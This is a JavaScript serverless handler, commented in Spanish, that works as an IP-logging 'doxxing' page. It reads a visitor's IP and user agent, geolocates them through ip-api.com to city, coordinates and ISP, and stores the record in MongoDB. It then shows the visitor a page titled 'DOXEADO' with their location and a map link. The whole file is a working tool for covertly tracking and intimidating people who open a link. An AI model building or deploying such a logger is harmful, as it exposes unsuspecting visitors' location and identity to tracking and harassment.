import clientPromise from "../lib/db.js";

export default async function handler(req, res) {
  try {
    const client = await clientPromise;
    const db = client.db("ipdb");

    // 1. Obtención de la IP
    let ip = req.headers["x-forwarded-for"] || req.socket?.remoteAddress || "";
    if (ip.includes(",")) ip = ip.split(",")[0].trim();
    if (ip === "::1" || ip === "127.0.0.1") ip = "186.157.76.46"; 

    // 2. Consulta API de Geolocalización
    const geoRes = await fetch(`http://ip-api.com/json/${ip}?fields=status,country,regionName,city,lat,lon,timezone,isp`);
    const geo = await geoRes.json();

    // 3. Extraer Dispositivo de forma sencilla
    const ua = req.headers["user-agent"] || "";
    let dispositivo = "Desconocido";
    if (ua.includes("iPhone")) dispositivo = "iPhone";
    else if (ua.includes("Android")) dispositivo = "Android";
    else if (ua.includes("Windows")) dispositivo = "PC (Windows)";
    else if (ua.includes("Macintosh")) dispositivo = "Mac";
    else if (ua.includes("Linux")) dispositivo = "Linux";

    // 4. Formatear Fecha
    const fechaActual = new Date().toLocaleString("es-AR", {
      dateStyle: "long",
      timeStyle: "short",
    });

    const data = {
      ip,
      city: geo.city || "Desconocido",
      region: geo.regionName || "Desconocido",
      country: geo.country || "Desconocido",
      lat: geo.lat || 0,
      lon: geo.lon || 0,
      isp: geo.isp || "N/A",
      dispositivo: dispositivo,
      fecha: fechaActual
    };

    // 5. Guardar en DB
    await db.collection("ips").insertOne({ ...data, date: new Date(), rawUA: ua });

    // 6. RESPUESTA HTML/CSS
    res.setHeader("Content-Type", "text/html");
    return res.status(200).send(`
      <!DOCTYPE html>
      <html lang="es">
      <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Detalles de tu Conexión</title>
        <style>
          body { 
            font-family: 'Inter', system-ui, -apple-system, sans-serif; 
            background-color: #0b0f1a; color: #e2e8f0; 
            display: flex; justify-content: center; align-items: center; 
            min-height: 100vh; margin: 0; 
          }
          .card { 
            background: #161e2d; border-radius: 20px; padding: 2.5rem; 
            box-shadow: 0 25px 50px -12px rgba(0,0,0,0.5); width: 90%; max-width: 400px; 
            border: 1px solid #1e293b;
          }
          .header { text-align: center; margin-bottom: 2rem; }
          .header h1 { color: #60a5fa; margin: 0; font-size: 1.4rem; }
          .header p { color: #64748b; font-size: 0.9rem; margin-top: 5px; }
          
          .stat { margin-bottom: 1.2rem; }
          .label { font-size: 0.7rem; color: #64748b; text-transform: uppercase; font-weight: 700; }
          .value { font-size: 1.05rem; color: #f1f5f9; margin-top: 2px; }
          
          .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; }
          
          .map-btn {
            display: block; margin-top: 1.5rem; width: 100%; text-align: center;
            background: #2563eb; color: white; padding: 12px; border-radius: 10px;
            text-decoration: none; font-weight: 600; font-size: 0.9rem;
            transition: all 0.2s ease; box-sizing: border-box;
          }
          .map-btn:hover { background: #3b82f6; transform: translateY(-2px); }
        </style>
      </head>
      <body>
      <h1>DOXEADO</h1>
        <div class="card">
          <div class="header">
            <h1>Acceso Registrado</h1>
            <p>${data.fecha}</p>
          </div>
          
          <div class="stat">
            <div class="label">Dispositivo detectado</div>
            <div class="value">📱 ${data.dispositivo}</div>
          </div>

          <div class="stat">
            <div class="label">Dirección IP</div>
            <div class="value">${data.ip}</div>
          </div>

          <div class="stat">
            <div class="label">Ubicación</div>
            <div class="value">📍 ${data.city}, ${data.country}</div>
          </div>

          <div class="grid">
            <div class="stat">
              <div class="label">Latitud</div>
              <div class="value">${data.lat}</div>
            </div>
            <div class="stat">
              <div class="label">Longitud</div>
              <div class="value">${data.lon}</div>
            </div>
          </div>

          <div class="stat">
            <div class="label">Proveedor de Internet</div>
            <div class="value" style="font-size: 0.9rem;">${data.isp}</div>
          </div>

          <a href="https://www.google.com/maps?q=${data.lat},${data.lon}" target="_blank" class="map-btn">
            Abrir ubicación en el Mapa
          </a>
        </div>
      </body>
      </html>
    `);

  } catch (err) {
    console.error(err);
    return res.status(500).send("Error del servidor");
  }
}